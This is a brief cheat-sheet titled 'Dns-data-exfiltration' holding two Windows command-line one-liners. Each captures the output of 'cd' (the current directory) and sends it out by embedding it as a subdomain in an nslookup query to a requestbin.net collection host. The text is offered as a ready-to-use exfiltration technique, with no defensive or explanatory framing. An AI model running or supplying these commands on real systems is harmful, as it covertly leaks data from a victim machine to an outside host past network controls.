# Dns-data-exfiltration

for /f %i in ('cd') do nslookup %i.4f4984e83e92a11d53b7.d.requestbin.net
for /f "tokens=1" %i IN ('cd') do (nslookup %i.4f4984e83e92a11d53b7.d.requestbin.net)
